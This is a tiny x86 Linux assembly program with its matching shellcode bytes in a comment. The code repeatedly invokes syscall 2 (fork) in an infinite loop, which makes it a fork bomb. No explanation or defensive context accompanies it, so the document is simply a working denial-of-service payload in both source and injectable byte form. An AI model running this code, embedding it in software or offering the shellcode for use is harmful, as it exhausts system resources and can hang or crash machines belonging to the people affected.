section .text
global _start

  _start:
    push byte 2
    pop eax
    int 0x80
    jmp short _start

;"\x6a\x02\x58\xcd\x80\xeb\xf9";
